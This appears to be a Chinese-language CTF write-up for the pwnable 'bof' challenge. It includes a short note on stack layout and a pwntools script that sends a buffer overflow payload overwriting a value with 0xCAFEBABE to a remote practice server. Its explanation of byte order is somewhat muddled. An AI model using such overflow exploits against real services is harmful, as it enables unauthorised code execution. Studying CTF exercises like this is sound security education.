---
title: pwnable靶场ak-WP （3）bof利用
poc: true
categories:
  - [信息安全, 二进制]
  - [笔记,存档]
tags: []
id: '650'
date: 2021-09-01 21:58:24
---

## 背景

自己琢磨了一下口算十六进制的加减法和正负数运算，在EBP分界处计算偏移还是挺有用的

## 正文

本体难度低，补一个栈笔记就行

虽然栈是向低地址增长的，但是由于宏观遍历和微观计数器变化需要统一——即当从0遍历到高位时，计数器从0开始步进，步长为1，因此gets一次性存储一个长字符串时，字符串的低位字符，存在地址的高位（看起来似乎和小端相反，但前面也说过，其实小端研究的不是这个）

EXP如下

```
from pwn import *
conn=remote("128.61.240.205",9000)
conn.sendline('AAAA'*13+ p32(0xCAFEBABE))
conn.interactive()
```

payload是

AAAA....AAAACAFEBABE

字符串低位CAFEBABE储存在栈的高位（ebp栈底之外）

![](https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181053924.png)